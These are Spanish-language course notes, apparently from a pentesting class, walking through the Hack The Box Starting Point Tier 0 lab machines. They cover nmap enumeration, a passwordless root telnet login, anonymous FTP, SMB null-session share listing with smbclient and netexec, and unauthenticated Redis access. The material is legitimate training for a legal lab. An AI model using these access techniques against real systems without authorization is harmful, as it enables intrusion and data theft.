# ① ¿Qué es Hack The Box?

Hack The Box (HTB) es una de las plataformas de ciberseguridad más grandes del sector, orientada a la práctica. Permite practicar habilidades de hacking de forma legal y ética, sin tener que atacar sistemas reales. El objetivo en cada máquina es, mediante la explotación de vulnerabilidades, conseguir una o varias flags.

Una flag es un archivo de texto (normalmente flag.txt) cuyo contenido se valida en la plataforma para demostrar que has comprometido el servidor. Es el mismo concepto que se usa en el examen de Evolve, en el eJPT y en prácticamente todas las certificaciones del sector.

| | |
|---|---|
|**💡 FLAGS**|En HTB las flags a veces son dinámicas: cada usuario tiene una flag distinta. Si una flag da error al validarla, prueba a reiniciar la máquina o cambiarla de servidor.|

|**Apartado**|**Para qué sirve**|
|---|---|
|HTB Labs|Catálogo principal de máquinas vulnerables. Es donde trabajaremos. Incluye el Starting Point.|
|Starting Point|Ruta guiada de iniciación (Tier 0, 1, 2). Máquinas very easy con un servicio concreto a explotar.|
|HTB Academy|Aprendizaje guiado por módulos. Excelente para teoría. Aquí viven las certificaciones de HTB.|
|Challenges|Retos aislados por categoría: web, reversing, criptografía, OSINT, forense...|
|Sherlocks|Ejercicios defensivos / respuesta a incidentes (Blue Team, forense).|
|Pro Labs|Entornos corporativos completos con múltiples máquinas de Directorio Activo. Dan certificado propio. Suscripción aparte.|
|Fortress|Laboratorios creados por empresas externas (AWS, Synack...). Ataques encadenados, nivel alto.|
|Tracks|Recopilaciones de máquinas y retos sobre una temática concreta (blockchain, pivoting...).|

| | |
|---|---|
|**💡 CERTIFICACIONES HTB**|Las certificaciones de HTB son relativamente asequibles (~400 €) y muy buenas para aprender, pero a día de hoy tienen poco reconocimiento en el mercado frente a OSCP. El examen suele ser conseguir 30-40 flags en unos 5 días.|

| | |
|---|---|
|**⚠ POUNDBOX vs KALI**|HTB ofrece el Pwnbox (un Parrot en la nube con tiempo limitado al día). La recomendación es usar tu propia Kali conectándote por VPN: sin límites de tiempo y más control.|

# ② Conexión a la red privada de HTB (VPN)

Para atacar las máquinas hay que conectarse a la red privada de HTB mediante OpenVPN. Cada zona tiene su propio archivo de VPN: el del Starting Point NO sirve para las máquinas activas (Machines) y viceversa.

**Flujo de conexión:**

| | | | | | | | | |
|---|---|---|---|---|---|---|---|---|
|**Connect (HTB)**|**→**|**Starting Point → OpenVPN**|**→**|**Descargar .ovpn**|**→**|**sudo openvpn fichero**|**→**|**Verificar tun0**|

| |
|---|
|# 1. Descargar el .ovpn desde HTB (botón Connect arriba a la derecha)<br><br>#    Lo más cómodo: abrir Firefox dentro de la Kali y descargarlo ahí<br><br>#    directamente, así no hay que pasar archivos entre host y VM.<br><br># 2. Lanzar la VPN (dejar SIEMPRE esta terminal abierta):<br><br>sudo openvpn starting_point_chema.ovpn<br><br># 3. Esperar el mensaje de éxito:<br><br>#    Initialization Sequence Completed<br><br># 4. En OTRA terminal, verificar el adaptador de la VPN:<br><br>ifconfig          # aparece un nuevo adaptador: tun0<br><br>#  -> esa IP (tun0) es TU identidad de cara a HTB|

| | |
|---|---|
|**⚠ VPN SIEMPRE ABIERTA**|Si cierras la terminal de la VPN, pierdes la conexión y la visibilidad de las máquinas. El mismo fichero .ovpn vale para todo el Starting Point y se reutiliza siempre (a veces hay que regenerarlo si HTB falla).|

| | |
|---|---|
|**💡 PASAR ARCHIVOS HOST → KALI**|Si no descargas el .ovpn dentro de la Kali, puedes usar una carpeta compartida (VirtualBox/VMware). Se monta en /media/sf_NOMBRE. El portapapeles y arrastrar-soltar bidireccional dan muchos problemas, sobre todo en VirtualBox.|

# ③ Metodología: enumeración primero, siempre

Toda evaluación de seguridad empieza por la enumeración. El objetivo es aprender lo máximo posible del objetivo antes de atacar. El orden de trabajo es idéntico al visto en Metasploitable 2.

| | | | | | | | | |
|---|---|---|---|---|---|---|---|---|
|**Crear carpetas (mkdir)**|**→**|**Nmap (enumerar)**|**→**|**Investigar servicio (HackTricks)**|**→**|**Explotar**|**→**|**Buscar la flag**|

| |
|---|
|# Estructura de trabajo por máquina:<br><br>cd ~/HTB<br><br>mkdir Meow && cd Meow<br><br>mkdir recon<br><br># Escaneo base de servicios y versiones:<br><br>nmap -sV -Pn -vvv -oA recon/meow <IP><br><br>#  -sV  detecta versión del servicio<br><br>#  -Pn  omite el ping (host discovery) -> útil si hay firewall que<br><br>#       bloquea ICMP y haría que Nmap no 'viera' la máquina<br><br>#  -vvv verbose, va mostrando resultados según escanea<br><br>#  -oA  guarda en los 3 formatos (normal, grepeable, XML)<br><br># Segunda pasada SIEMPRE a todos los puertos:<br><br>nmap -p- -Pn <IP><br><br>#  un servicio en el puerto 55000 no existe para ti si no lo escaneas|

| | |
|---|---|
|**ℹ PING Y FIREWALL**|ping usa ICMP y puede dar falsos negativos: un firewall que bloquee ICMP hará que la máquina parezca caída estando viva. Por eso Nmap se lanza con -Pn, para que no descarte el host por no responder al ping.|

| | |
|---|---|
|**📖 HACKTRICKS**|Para cada servicio/puerto desconocido, consulta book.hacktricks.xyz. Cada página de 'Pentesting <servicio>' trae los comandos de enumeración y los ataques típicos. No te saltes el paso de investigar.|

| | |
|---|---|
|**🔐 NO HACER TRAMPAS**|Resolver las máquinas copiando write-ups no construye conocimiento. En una prueba técnica real (p. ej. un CTF de 2 h con proctoring viendo tu pantalla) o sabes explotarlo o no. Pelearse con la máquina ES el aprendizaje.|

# ④ Máquina Meow — Telnet (puerto 23)

Telnet es un protocolo antiguo de administración remota de equipos en red. Su problema fundamental es que transmite todo en texto plano, incluidas las credenciales, por lo que está desaconsejado y ha sido sustituido por SSH. En esta máquina, además, está mal configurado: permite acceso sin contraseña.

Resultado del escaneo: solo el puerto 23 (telnet) abierto. Al ser very easy, hay un único servicio que explotar.

| | | | | | | | | |
|---|---|---|---|---|---|---|---|---|
|**Nmap → puerto 23**|**→**|**telnet <IP>**|**→**|**Probar root (sin pass)**|**→**|**id / pwd / ls**|**→**|**cat flag.txt**|

| |
|---|
|# Conectarse al servicio Telnet:<br><br>telnet 10.129.x.x<br><br>#  aparece un prompt de login (Meow login:)<br><br># Probar cuentas típicas SIEMPRE: admin, administrator, root...<br><br>#  root entra SIN contraseña (mala configuración: root sin password)<br><br>Meow login: root<br><br># Una vez dentro, comprobar quién somos:<br><br>id                # uid=0(root) -> somos root, todos los permisos<br><br>pwd               # /root<br><br>ls                # flag.txt  snap<br><br>cat flag.txt      # -> flag del root|

| | |
|---|---|
|**💡 DÓNDE ESTÁN LAS FLAGS**|En HTB la flag está casi siempre en el escritorio / home del usuario con el que entras o del root: /root/flag.txt o /home/<usuario>/... Acostúmbrate a hacer pwd y ls nada más entrar.|

| | |
|---|---|
|**🔐 LA VULNERABILIDAD**|No es un fallo 'por defecto': es una mala configuración concreta — el usuario root no tiene contraseña. Probar root sin password es de las primeras cosas que hay que intentar siempre.|

# ⑤ Máquina Fawn — FTP (puerto 21)

FTP (File Transfer Protocol) transfiere ficheros entre cliente y servidor usando conexiones separadas de control y datos. Las credenciales viajan en texto claro. Lo que buscamos es el acceso anónimo, una configuración muy común y muy golosa que permite entrar sin credenciales válidas.

Variantes seguras (no en esta máquina, pero a conocer): FTPS (FTP sobre TLS) y SFTP (FTP tunelizado sobre SSH).

| | | | | | | | | |
|---|---|---|---|---|---|---|---|---|
|**Nmap → puerto 21 (vsftpd)**|**→**|**ftp <IP>**|**→**|**Login anonymous**|**→**|**ls / get**|**→**|**flag.txt**|

| |
|---|
|nmap -sV -Pn -vvv -oA recon/fawn <IP><br><br>#  21/tcp open  ftp  vsftpd 3.0.3   (la versión la da -sV)<br><br>#  Vía alternativa: searchsploit vsftpd 3.0.3 (buscar exploit)<br><br># Probar login anónimo:<br><br>ftp 10.129.x.x<br><br>Name: anonymous<br><br>Password:            # (cualquiera / vacía)<br><br>#  230 Login successful   <- 230 = código de login correcto<br><br># Listar y descargar:<br><br>ls                   # (o 'dir') lista ficheros -> flag.txt<br><br>get flag.txt         # descarga un único fichero<br><br>mget *               # 'multiple get': descarga varios a la vez<br><br>exit<br><br>cat flag.txt|

|**Comando FTP**|**Función**|
|---|---|
|anonymous|Usuario para el login anónimo (password en blanco o cualquiera).|
|ls / dir|Listar ficheros y directorios del servidor.|
|get <fichero>|Descargar un único fichero.|
|mget *|Multiple GET: descargar varios ficheros (el * sustituye a 'todos').|
|help / ?|Mostrar el menú de comandos del cliente FTP.|

| | |
|---|---|
|**✓ OBJETIVO**|FTP: identificar versión con Nmap → probar login anonymous → ls → get/mget de los ficheros → leer la flag. Trabaja en terminal puro, no con clientes gráficos tipo FileZilla.|

# ⑥ Máquina Dancing — SMB (puerto 445)

SMB (Server Message Block) es un protocolo de Windows para compartir ficheros, impresoras y carpetas (shares) en red. Opera principalmente en el puerto 445 (el 139 es legacy). Es uno de los protocolos más usados y más explotados en entornos corporativos.

El escaneo muestra puertos típicos de Windows: 135, 139, 445 y 5985 (WinRM). El 445 es el que nos interesa.

| | | | | | | | | |
|---|---|---|---|---|---|---|---|---|
|**Nmap → 445 (SMB)**|**→**|**Listar shares**|**→**|**Ver permisos**|**→**|**Conectar al share**|**→**|**get flag.txt**|

| |
|---|
|# Listar shares con sesión nula (smbclient):<br><br>smbclient -N -L //10.129.x.x<br><br>#  -N  sin contraseña (null session)   -L  listar shares<br><br>#  problema: NO muestra los permisos (lectura/escritura)<br><br># Ver permisos con NetExec (fundamental en Windows):<br><br>netexec smb 10.129.x.x -u '' -p '' --shares<br><br>#  a veces hay que poner 'algo' en el usuario para que liste:<br><br>netexec smb 10.129.x.x -u 'a' -p '' --shares<br><br>#  -> WorkShares  READ,WRITE   |  IPC$  READ ...<br><br># Conectarse al share concreto (4 barras suelen funcionar siempre):<br><br>smbclient -N //10.129.x.x/WorkShares<br><br>ls                       # navegar carpetas de cada usuario<br><br>cd Amy.J                 # entrar en una carpeta<br><br>get worknotes.txt        # descargar ficheros interesantes<br><br>cd ../James.P<br><br>get flag.txt<br><br>exit|

| | |
|---|---|
|**ℹ SHARES Y NETEXEC**|Cada línea del listado (ADMIN$, C$, IPC$, WorkShares...) es una carpeta compartida. NetExec es muy sensible a cómo se construye el comando: según los parámetros, devuelve resultados o no. Conviene dominar la herramienta.|

| | |
|---|---|
|**ℹ SMBMap**|smbmap es una alternativa para ver permisos: smbmap -u '' -p '' -H <IP>. A veces falla si no se le pasa algún usuario; suele ir mejor cuando hay credenciales.|

| | |
|---|---|
|**🔐 SMB Y WANNACRY**|SMB es el protocolo explotado por EternalBlue (MS17-010), usado en WannaCry (2017) para moverse lateralmente. En Directorio Activo aparecen muchas más vulnerabilidades de SMB/Samba mal configurado.|

| | |
|---|---|
|**✓ OBJETIVO**|SMB: listar shares → ver permisos (lectura/escritura) → conectar al share legible → bichear LS carpeta por carpeta. En carpetas compartidas suele haber credenciales en texto claro o información confidencial reutilizable.|

# ⑦ Máquina Redeemer — Redis (puerto 6379)

Redis (Remote Dictionary Server) es un almacén de base de datos NoSQL del tipo clave-valor. Es una base de datos in-memory (los datos residen en RAM, no en disco), lo que la hace muy rápida; se usa típicamente como caché o broker de mensajes.

Aquí el primer escaneo (top 1000) no encuentra nada. Hay que escanear TODOS los puertos (-p-) para descubrir el 6379. La vulnerabilidad es que Redis está expuesto sin autenticación: cualquiera puede conectarse y leer los datos.

| | | | | | | | | |
|---|---|---|---|---|---|---|---|---|
|**Nmap -p- → 6379**|**→**|**redis-cli -h <IP>**|**→**|**info**|**→**|**select 0 → keys ***|**→**|**get flag**|

| |
|---|
|# El top 1000 no da nada -> escanear TODOS los puertos:<br><br>nmap -p- -Pn <IP>        # 65535 puertos -> aparece 6379 (Redis)<br><br># Instalar el cliente si no está:<br><br>sudo apt install redis-tools<br><br># Conectarse (Redis sin autenticación):<br><br>redis-cli -h 10.129.x.x<br><br># Comandos clave dentro de Redis:<br><br>info             # info y estadísticas del servidor<br><br>                 #  -> sección Keyspace: db0:keys=4 ...<br><br>select 0         # seleccionar la base de datos (índice 0)<br><br>keys *           # listar todas las claves: store num flag temp<br><br>get flag         # obtener el valor de la clave 'flag' -> la flag|

| | |
|---|---|
|**💡 MODELO CLAVE-VALOR**|Al ser NoSQL, Redis guarda los datos como pares clave-valor (como un diccionario). La clave es el 'nombre' (store, num, flag, temp) y el valor es su contenido, que se recupera con get <clave>. La sección Keyspace del info dice cuántas bases de datos y claves hay.|

| | |
|---|---|
|**🔐 LA VULNERABILIDAD**|Por defecto Redis puede accederse sin credenciales. Si no se configura una contraseña (requirepass), cualquier usuario con visibilidad de red se conecta, lee datos y, en muchos escenarios reales, llega incluso a ejecución de comandos.|

# ⑧ Resumen: máquinas del Tier 0

|**Máquina**|**Puerto / Servicio**|**Vector**|**Acceso**|
|---|---|---|---|
|Meow|23 / Telnet|Login root sin contraseña|root directo|
|Fawn|21 / FTP|Login anónimo (anonymous)|Lectura de ficheros|
|Dancing|445 / SMB|Null session + share WorkShares|Ficheros del share|
|Redeemer|6379 / Redis|Sin autenticación + keys/get|Lectura de la BD|

Patrón común a todas: enumerar con Nmap → identificar el servicio → investigar en HackTricks cómo se ataca → explotar una mala configuración (credenciales por defecto, acceso anónimo, falta de autenticación) → leer la flag. Como decía el instructor, los servicios son siempre los mismos: a la quincuagésima vez los explotas con los ojos cerrados.

# ⑨ Consejos del instructor

| | |
|---|---|
|**✓ AUTONOMÍA**|Ante un bloqueo de configuración, intenta resolverlo tú mismo: busca en Google, prueba, itera. Saber buscar y ser autónomo es un diferenciador muy fuerte en el sector.|

| | |
|---|---|
|**⚠ CERTIFICACIONES ≠ NIVEL TÉCNICO**|Acumular certificaciones no garantiza nivel. En una entrevista técnica o sabes explotar un Directorio Activo o no. Negocia con la empresa que te paguen una certificación anual (OSCP, CRTO...).|

| | |
|---|---|
|**🔐 IA: SÍ PARA HERRAMIENTAS, NO PARA EXPLOTAR**|Aprende a explotar manualmente para entender qué pasa por debajo. En auditorías reales no podrás usar IA (los datos del cliente no pueden ir a servidores de OpenAI/Anthropic por protección de datos). Usa la IA para crearte herramientas y para automatizar lo que YA sabes hacer a mano.|

| | |
|---|---|
|**💡 RUTA**|Primero las bases sin IA. Una vez resuelta una máquina manualmente, repítela automatizándola con un script propio. Repasa y repite las máquinas: son tu laboratorio.|



---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../../transcripciones/Junio/02.06.2026 Introducción a HackTheBox Starting Point Tier0.md|02.06.2026 Introducción a HackTheBox Starting Point Tier0]] — Linux, Nmap, OSINT
- [[../../apuntes Joselu/MODULO3/resumen_master_clase26.md|resumen_master_clase26]] — Linux, Nmap, OSINT
- [[../../apuntes Joselu/MODULO3/resumen_master_clase20.md|resumen_master_clase20]] — Linux, Nmap, Windows
- [[../../Apuntes/12 - Blue Team y SOC/Blue Team - SOC e Incidentes.md|Blue Team - SOC e Incidentes]] — Linux, Nmap, OSINT
- [[../../apuntes evolve/BLOQUE 15.md|BLOQUE 15]] — Linux, Nmap, OSINT
- [[../../apuntes Joselu/MODULO1/resumen_master_clase1.md|resumen_master_clase1]] — Linux, OSINT, Windows

### 🛠️ Herramientas

- [[comandos/Nmap|Nmap]]
- [[comandos/SMB_Impacket|SMB / Impacket]]
- [[comandos/SSH|SSH]]
- [[comandos/Telnet|Telnet]]

> #blue-team #certificaciones #forense #hack-the-box #kali #linux #metasploitable #nmap #osint #pentest #pivoting #redes #smb-impacket #ssh #telnet #windows
